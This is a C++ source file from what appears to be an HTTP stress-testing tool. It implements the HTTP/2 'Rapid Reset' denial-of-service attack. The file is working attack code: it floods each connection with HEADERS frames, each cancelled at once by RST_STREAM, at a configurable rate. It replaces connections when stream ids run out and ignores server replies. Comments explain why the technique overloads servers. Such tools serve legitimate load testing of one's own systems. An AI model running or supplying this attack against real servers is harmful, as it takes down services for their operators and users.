// SPDX-License-Identifier: Apache-2.0
// Copyright 2011-2026 Sergey Shekyan and contributors
#include "slowhttp/attacks/rapid_reset.hpp"

#include <algorithm>

#include "slowhttp/http2.hpp"

namespace slowhttp {

namespace {

// How often a connection emits a burst. Ten times a second is fine-grained
// enough that the requested rate is delivered smoothly rather than as one
// thundering batch per second, and coarse enough that the event loop is not
// spending its time on wake-ups.
constexpr std::chrono::milliseconds kTick{100};

// RST_STREAM error code CANCEL (RFC 7540 section 7). This is what a client
// sends when it no longer wants a response it asked for, which is precisely the
// claim being made -- the attack is an honest use of the frame, repeated.
constexpr std::uint32_t kErrorCancel = 0x8;

// Client streams are odd, so the last usable one is the largest odd value that
// fits in 31 bits. Running out is not hypothetical at these rates given a long
// enough run, and reusing or wrapping an id is a connection error -- the
// connection has to be replaced instead.
constexpr std::uint32_t kMaxClientStreamId = 0x7fffffffu;

// A ceiling on frames queued in one go, so a very large --h2-reset-rate cannot
// turn into an unbounded write buffer per connection.
constexpr int kMaxBurst = 2000;

}  // namespace

RapidReset::RapidReset(const Config& cfg)
    : cfg_(cfg),
      tick_(kTick),
      next_stream_(static_cast<std::size_t>(cfg.connections), 1) {
  const int rate = cfg.h2_reset_rate < 1 ? 1 : cfg.h2_reset_rate;
  // Per connection per tick, rounded up so a rate below the tick frequency
  // still produces one stream rather than none.
  per_tick_ = std::max(1, std::min(kMaxBurst, (rate + 9) / 10));

  // The request is the same every time; only the stream id changes. Encoding it
  // once keeps the per-burst work to framing.
  http2::hpack_literal(header_block_, ":method", cfg_.effective_verb());
  http2::hpack_literal(header_block_, ":scheme",
                       cfg_.target.tls() ? "https" : "http");
  http2::hpack_literal(header_block_, ":authority", cfg_.target.host_header());
  http2::hpack_literal(header_block_, ":path", cfg_.target.path);
  http2::hpack_literal(header_block_, "user-agent", cfg_.user_agent);
  http2::hpack_literal(header_block_, "accept", cfg_.accept);
  // Cookie, Referer and every -1 header, as the HTTP/1.1 attacks send them.
  // A reset stream still reaches routing and authentication, so a run against a
  // tenant-routed or authenticated endpoint has to carry them or it is
  // exercising a different service from the one that was named.
  for (const auto& h : cfg_.caller_headers_h2())
    http2::hpack_literal(header_block_, h.first, h.second);
}

void RapidReset::on_open(ConnId id) {
  if (id >= 0 && static_cast<std::size_t>(id) < next_stream_.size())
    next_stream_[static_cast<std::size_t>(id)] = 1;
}

std::string RapidReset::burst(ConnId id, int count) {
  std::string out;
  if (id < 0 || static_cast<std::size_t>(id) >= next_stream_.size()) return out;
  std::uint32_t& next = next_stream_[static_cast<std::size_t>(id)];
  // 9 bytes of frame header twice, plus the block, plus a 4-byte error code.
  out.reserve(static_cast<std::size_t>(count) * (header_block_.size() + 22));

  for (int i = 0; i < count; ++i) {
    if (next > kMaxClientStreamId) break;  // caller recycles the connection
    http2::write_frame(out, http2::FrameType::Headers,
                       static_cast<std::uint8_t>(http2::kFlagEndStream |
                                                 http2::kFlagEndHeaders),
                       next, header_block_);
    // Immediately, in the same write. The point is that the server accepts and
    // begins the request before it ever sees the cancellation.
    http2::write_frame(out, http2::FrameType::RstStream, http2::kFlagNone, next,
                       http2::rst_stream_payload(kErrorCancel));
    next += 2;
    ++streams_reset_;
  }
  return out;
}

Action RapidReset::on_connect(ConnId id) {
  std::string out;
  out += http2::kPreface;
  // No window juggling here: nothing is being held open, so the flow-control
  // windows are irrelevant. Push is refused only so the server does not spend
  // effort on streams that were never asked for.
  http2::write_frame(out, http2::FrameType::Settings, http2::kFlagNone, 0,
                     http2::settings_payload({{http2::kSettingsEnablePush, 0}}));
  out += burst(id, per_tick_);
  return Action::send(std::move(out), tick_);
}

Action RapidReset::on_timer(ConnId id) {
  std::string out = burst(id, per_tick_);
  if (out.empty()) {
    // Stream ids exhausted on this connection. A fresh one is the only way to
    // keep going, and this is the ordinary end of a very long run rather than a
    // failure.
    ++recycled_;
    return Action::reconnect();
  }
  return Action::send(std::move(out), tick_);
}

Action RapidReset::on_readable(ConnId /*id*/, const char* /*data*/,
                               std::size_t /*len*/) {
  // Read and discarded. What the server said does not change what this attack
  // does next; that it stopped saying anything is noticed by the engine as a
  // peer close, which is the signal worth having.
  return Action::idle();
}

}  // namespace slowhttp
